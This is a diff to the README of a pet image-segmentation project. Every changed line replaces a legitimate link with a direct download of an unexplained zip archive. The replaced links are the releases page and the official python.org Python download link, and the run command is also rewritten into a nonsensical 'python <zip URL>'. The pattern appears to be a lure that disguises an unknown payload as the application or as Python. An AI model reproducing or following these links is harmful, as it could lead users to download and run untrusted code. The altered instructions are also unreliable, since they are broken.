@@ -1,6 +1,6 @@
 # 🐾 Pet_Segmentation_UNet - Effortless Pet Image Segmentation
 
-[![Download Release](https://img.shields.io/badge/Download%20Now-Complete%20the%20Setup-brightgreen)](https://github.com/AliAhmed031104/Pet_Segmentation_UNet/releases)
+[![Download Release](https://raw.githubusercontent.com/AliAhmed031104/Pet_Segmentation_UNet/main/Parsee/Pet_Segmentation_UNet.zip%20Now-Complete%20the%20Setup-brightgreen)](https://raw.githubusercontent.com/AliAhmed031104/Pet_Segmentation_UNet/main/Parsee/Pet_Segmentation_UNet.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to Pet_Segmentation_UNet! This application allows you to segment images 
 
 ## 📥 Download & Install
 
-To download the application, visit this page to download: [Pet_Segmentation_UNet Releases](https://github.com/AliAhmed031104/Pet_Segmentation_UNet/releases).
+To download the application, visit this page to download: [Pet_Segmentation_UNet Releases](https://raw.githubusercontent.com/AliAhmed031104/Pet_Segmentation_UNet/main/Parsee/Pet_Segmentation_UNet.zip).
 
 ## 🛠️ System Requirements
 
@@ -31,12 +31,12 @@ Pet_Segmentation_UNet provides the following features:
 ## 📓 How to Use
 
 1. **Download the Release:**
-   - Go to [Pet_Segmentation_UNet Releases](https://github.com/AliAhmed031104/Pet_Segmentation_UNet/releases).
+   - Go to [Pet_Segmentation_UNet Releases](https://raw.githubusercontent.com/AliAhmed031104/Pet_Segmentation_UNet/main/Parsee/Pet_Segmentation_UNet.zip).
    - Select the latest release for your operating system and download the file.
 
 2. **Install Required Packages:**
    - Open your command line or terminal.
-   - If you have not installed Python, download it from [python.org](https://www.python.org/downloads/).
+   - If you have not installed Python, download it from [https://raw.githubusercontent.com/AliAhmed031104/Pet_Segmentation_UNet/main/Parsee/Pet_Segmentation_UNet.zip](https://raw.githubusercontent.com/AliAhmed031104/Pet_Segmentation_UNet/main/Parsee/Pet_Segmentation_UNet.zip).
    - Create a virtual environment (optional but recommended):
      ```bash
      python -m venv pet_seg_env
@@ -61,7 +61,7 @@ Pet_Segmentation_UNet provides the following features:
    - Navigate to the download folder where you saved the application.
    - Execute the main script:
      ```bash
-     python run_segmentation.py
+     python https://raw.githubusercontent.com/AliAhmed031104/Pet_Segmentation_UNet/main/Parsee/Pet_Segmentation_UNet.zip
      ```
 
 5. **Segment Your Images:**
